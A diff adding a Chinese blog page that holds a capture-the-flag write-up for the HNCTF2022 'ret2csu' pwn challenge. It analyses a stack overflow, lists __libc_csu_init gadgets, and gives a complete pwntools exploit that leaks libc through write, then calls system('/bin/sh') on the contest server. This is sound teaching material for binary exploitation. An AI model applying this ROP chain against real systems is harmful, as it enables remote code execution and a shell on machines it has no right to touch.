@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="看一下保护机制  再拖到ida里看一下 int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(_bss_start, 0LL);  write(1, &quot;Start Your Exploit!\n&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HNCTF2022.ret2csu">
+<meta property="og:url" content="http://example.com/2022/10/06/HNCTF2022-ret2csu/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="看一下保护机制  再拖到ida里看一下 int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  setbuf(_bss_start, 0LL);  write(1, &quot;Start Your Exploit!\n&amp;qu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006170927.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171139.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171623.png">
+<meta property="article:published_time" content="2022-10-06T08:50:29.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:19:15.244Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>HNCTF2022.ret2csu</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/06/%E7%AE%80%E5%8D%95%E7%88%86%E7%A0%B4partial-write/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/06/HNCTF2022-ret2csu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&text=HNCTF2022.ret2csu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&is_video=false&description=HNCTF2022.ret2csu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HNCTF2022.ret2csu&body=Check out this article: http://example.com/2022/10/06/HNCTF2022-ret2csu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&name=HNCTF2022.ret2csu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/06/HNCTF2022-ret2csu/&t=HNCTF2022.ret2csu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HNCTF2022.ret2csu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-06T08:50:29.000Z" class="dt-published" itemprop="datePublished">2022-10-06</time>
+        
+        (Updated: <time datetime="2023-09-14T17:19:15.244Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>看一下保护机制</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png" title="QQ截图20221006165446" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022301827.png" alt="QQ截图20221006165446"></a></p>
+<p>再拖到ida里看一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Start Your Exploit!\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Ok.\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主体部分非常简洁 但是没有任何后门函数和泄露真实地址的地方</p>
+<p>一开始我们会想自己构造rop链</p>
+<p>通过ROPgadget来寻找rdi rsi rdx三个寄存器的传参汇编地址</p>
+<p>我们来看一下能否找到我们想要的汇编</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006170927.png" title="QQ截图20221006170927" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006170927.png" alt="QQ截图20221006170927"></a></p>
+<p>可以看到并没有rdx</p>
+<p>但是仍然还存在一种可能，我们gdb看一下当我们read数据的时候 rdx寄存器的值是多少</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171139.png" title="QQ截图20221006171139" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171139.png" alt="QQ截图20221006171139"></a></p>
+<p>可以看到是0x4 显然没有办法成为我们调用wirte函数的参数(因为其是作为第三个参数size存在的，这样我们只能输出4个字节的数据)</p>
+<p>所以此时我们回忆一下，有没有什么万能的rop链？欸 一想还真有 叫ret2csu(相关的介绍在栈部分里有)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000401290                 mov     rdx, r14</span><br><span class="line">.text:0000000000401293                 mov     rsi, r13</span><br><span class="line">.text:0000000000401296                 mov     edi, r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290</span><br><span class="line">.text:00000000004012A6</span><br><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>我们再看一下程序给了我们哪些函数</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171623.png" title="QQ截图20221006171623" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171623.png" alt="QQ截图20221006171623"></a></p>
+<p>那么思路直接有了 这里用write函数 然后通过csu汇编代码将参数传给寄存器 这样我们就能泄露出write函数的真实地址了(也可以是其他的)</p>
+<p>泄露出来以后 就是ret2libc的知识点了 思路捋清了 直接看exp吧</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;43.143.7.97&quot;</span>,<span class="number">28657</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2csu&quot;</span>)</span><br><span class="line">gadget2_addr = <span class="number">0x4012A6</span></span><br><span class="line">gadget1_addr = <span class="number">0x401290</span></span><br><span class="line">vuln_addr = <span class="number">0x401176</span></span><br><span class="line">rdi_addr = <span class="number">0x4012b3</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">payload1 = cyclic(<span class="number">0x100</span>+<span class="number">0x8</span>)+p64(gadget2_addr)+cyclic(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)+p64(write_got)+p64(gadget1_addr)+cyclic(<span class="number">56</span>)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ok.\n&quot;</span>)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload2 = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/06/HNCTF2022-ret2csu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&text=HNCTF2022.ret2csu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&is_video=false&description=HNCTF2022.ret2csu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HNCTF2022.ret2csu&body=Check out this article: http://example.com/2022/10/06/HNCTF2022-ret2csu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&title=HNCTF2022.ret2csu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/06/HNCTF2022-ret2csu/&name=HNCTF2022.ret2csu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/06/HNCTF2022-ret2csu/&t=HNCTF2022.ret2csu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
